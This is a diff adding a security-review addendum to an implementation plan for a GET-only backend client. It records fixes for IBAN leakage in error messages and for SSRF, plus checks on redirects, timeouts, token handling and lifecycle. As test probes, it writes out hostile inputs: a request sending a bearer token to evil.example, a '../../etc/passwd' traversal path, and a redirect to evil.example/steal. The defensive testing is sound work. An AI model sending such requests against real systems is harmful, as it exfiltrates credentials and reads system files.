@@ -1962,6 +1962,110 @@ git add packages/postern-core/src/postern_core/facade/client.py tests/test_facad
 git commit -m "feat(facade): GET-only backend client with injected token minter"
 ```
 
+**Addendum (2026-09-13, implementation-time security review — two leak paths closed,
+five more probed and reported):** the `_detail`/`get_json`/`BackendClient.__init__` code
+above is what the plan originally proposed; what was actually committed differs in the
+ways below, each with the measurement behind it.
+
+*Leak path 1 — `_detail` returned unscrubbed backend text into `BackendError`.* A
+`BackendError` raised inside a tool handler (Tasks 8-11) propagates to FastMCP and from
+there into the model's context, i.e. a vendor chat history that cannot be recalled. A
+bank backend's 4xx/5xx body can carry a PAN, IBAN, account number or customer name.
+Measured before the fix (this module standalone, not yet wired to a tool):
+`_detail(httpx2.Response(400, json={"detail": "transfer to GB29NWBK60161331926819
+rejected"}))` returned the raw IBAN unchanged. Fix: `_detail` now runs the derived text
+through `pydantic.TypeAdapter(postern_core.domain.masking.FreeText).validate_python`
+before truncating to 200 characters, and truncates *after* scrubbing, not before — cutting
+first could split a PAN/IBAN in half and leave an unmasked fragment past the cut, or a
+masked-but-truncated one before it. Verified: the same call now returns `"transfer to
+GB•• •••• 6819 rejected"`. Four tests added, covering the `detail`-key path, the
+no-`detail`-key fallback to the whole JSON body, the non-JSON `response.text` fallback,
+and the truncation-order case.
+
+*Leak path 2 — `path` was an unvalidated string and `httpx2` honours absolute URLs.*
+Spiked empirically with the same `httpx2.MockTransport` technique as decision 0001, against
+`httpx2` 2.12.0: a client built with `AsyncClient(base_url="https://backend.test")` sent
+`client.get("https://evil.example/x", headers={"Authorization": "Bearer secret-token"})`
+straight to `evil.example`, carrying the `Authorization` header — an SSRF that exfiltrates
+the internal bearer token to whatever the caller passes as `path`. `client.get("/accounts/
+../../etc/passwd")` stayed on `backend.test` in this version but resolved to
+`https://backend.test/etc/passwd`, escaping the intended path prefix.
+`client.get("//evil.example/x")` (protocol-relative) also stayed on `backend.test` in this
+version. Every call site today builds `path` from a `Ref`-validated value, so this is
+defence in depth, not the primary control. Fix: `_validate_path` rejects, via
+`urllib.parse.urlsplit`, any `path` carrying a scheme or a netloc (covers both the absolute
+and protocol-relative cases in one check regardless of which way a future `httpx2` version
+resolves the protocol-relative case), any `path` not starting with `/` (not rooted), and
+any `path` whose `/`-separated segments include a literal `..`. Percent-encoded traversal
+(`%2e%2e`) was spiked too and is not collapsed by `httpx2`, so it is left as an opaque path
+segment rather than checked for. Five tests added: absolute URL, protocol-relative,
+`..` segments, non-rooted, and one proving a rejected path never reaches the transport or
+mints a token (`_validate_path` runs before `self._minter(...)`).
+
+*Redirects.* Spiked: `httpx2.AsyncClient.__init__`'s own default is `follow_redirects=False`
+(confirmed via `inspect.signature`), and a `MockTransport` handler returning a `302` with a
+cross-host `Location` is returned as-is, not followed. The constructor now passes
+`follow_redirects=False` explicitly rather than relying on that default staying put across
+`httpx2` versions. One test added: a `302` from `backend.test` to `https://evil.example/steal`
+results in exactly one request, to `backend.test` only.
+
+*Timeout.* `timeout=10.0` becomes `httpx2.Timeout(10.0)`, which sets `connect`, `read`,
+`write` and `pool` to 10.0 **independently** (confirmed: `Timeout(10.0).connect == .read ==
+.write == .pool == 10.0`), not as one combined budget. A slow backend can therefore hang a
+single `get_json` call for close to 40 seconds in the worst case (connect + write + read +
+pool each separately budgeted at 10s), not 10. Recorded, not changed here: whether a tool
+call needs a tighter end-to-end budget than the sum of these four phases is a product
+decision (how long can an agent's tool call legitimately hang before the client gives up
+and the customer sees a stalled response) belonging with Task 12's composition, not this
+constructor default.
+
+*`StubTokenMinter`.* Nothing in this codebase can turn "never deploy this" into a hard
+failure without a deployment decision (an environment flag, a settings check) that Task 12
+owns. The cheap guard implemented here: `StubTokenMinter.__call__` now issues a
+`RuntimeWarning` (`stacklevel=2`) on every call, so a deployment that never wired the
+Vault-backed `InternalTokenMinter` is loud in logs/warning capture instead of silently
+minting a fake token. One test added asserting the warning fires and the token shape is
+unchanged.
+
+*The `Authorization` header.* Confirmed attached on every `get_json` call (existing test,
+unchanged). Spiked whether anything echoes it: `httpx2`'s own `Headers.__repr__` masks the
+`authorization` key to the literal string `'[secure]'` (measured:
+`Headers({"Authorization": "Bearer super-secret-token"})` reprs as `...'authorization':
+'[secure]'...`), and `httpx2`'s own request-completion log line (`INFO:httpx2:HTTP Request:
+GET https://backend.test/accounts "HTTP/1.1 200 OK"`) carries the method, URL and status
+line only, no headers. A manually raised `httpx2.HTTPStatusError` reprs/strs to just the
+message passed to it, not the request or its headers. Nothing in `client.py` itself logs or
+reprs the token. No code change; reported as a clean finding.
+
+*`aclose`.* Nothing in this task's scope calls it — `BackendClient` is constructed directly
+in every test and in `services/api/server.py`'s type signature only (no concrete instance
+exists yet; that is Task 12's composition root). As wired *today*, the client is not leaked
+per request or per server, because nothing yet constructs one outside a test, where `aclose`
+is already called explicitly in every test in `tests/test_facade_client.py`. This is a
+lifecycle question for Task 12 to answer once `services/api/main.py` constructs one
+`BackendClient` per process lifetime (or per request — that choice is Task 12's, not this
+one's): whichever it picks, `aclose` needs to run on shutdown (or after each request, if
+per-request) or the underlying connection pool leaks. Not built here per this task's scope.
+
+*No write method.* Confirmed via the plan's own `test_the_client_never_sends_a_write_method`
+(instance-level `hasattr` check, unchanged) plus one test added,
+`test_the_client_class_exposes_no_write_method_of_any_kind`, which enumerates the entire
+public callable surface of the class and asserts it equals exactly `{"get_json", "aclose"}`
+— so adding any future write method fails this test in CI, not only a code reviewer's
+attention.
+
+*Structural conformance with `BackendReader`.* `mypy --strict` passed across `packages
+services tests` with `BackendClient.get_json`'s signature written to match
+`postern_core.facade.protocol.BackendReader.get_json` exactly (same parameter names, types,
+positional/keyword-only split, and default). This module does not import `BackendReader`,
+per the plan. The structural check itself is not yet *exercised* by mypy — no code today
+assigns a `BackendClient` instance to a `BackendReader`-typed name, because `services/api/
+main.py` (Task 12) is what would construct one and pass it into `build_server(backend=...)`.
+That remains true until Task 12.
+
+Test count: `tests/test_facade_client.py` has 18 tests (5 from the plan's original Step 1,
+13 added for the two leak paths and the other probed findings above).
+
 ---
 
 ### Task 7: The golden masking test harness
